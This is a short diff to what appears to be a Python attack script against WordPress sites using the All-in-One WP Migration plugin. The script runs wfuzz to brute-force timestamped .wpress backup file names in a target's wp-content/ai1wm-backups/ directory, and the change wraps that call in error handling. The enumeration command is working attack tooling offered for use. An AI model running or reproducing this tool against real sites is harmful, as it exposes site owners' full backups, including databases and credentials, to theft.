@@ -76,7 +76,14 @@ if response.status_code == 200:
 		print ("Checking Plugin Version")
 		vercheck (url,headers)
 		print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
-		os.system("wfuzz -c -z range,01-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZ-FUZ2Z.wpress")
-
+		try:
+			os.system("wfuzz -c -z range,01-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZ-FUZ2Z.wpress")
+		except KeyboardInterrupt:
+			print ("Ctrl-c pressed ...")
+			sys.exit(1)
+				
+		except Exception as e:
+			print('Error: %s' % e)
+			sys.exit(1)
 else:
 	print ("[*] Sorry not able to find the file required to start the tests [*] ")
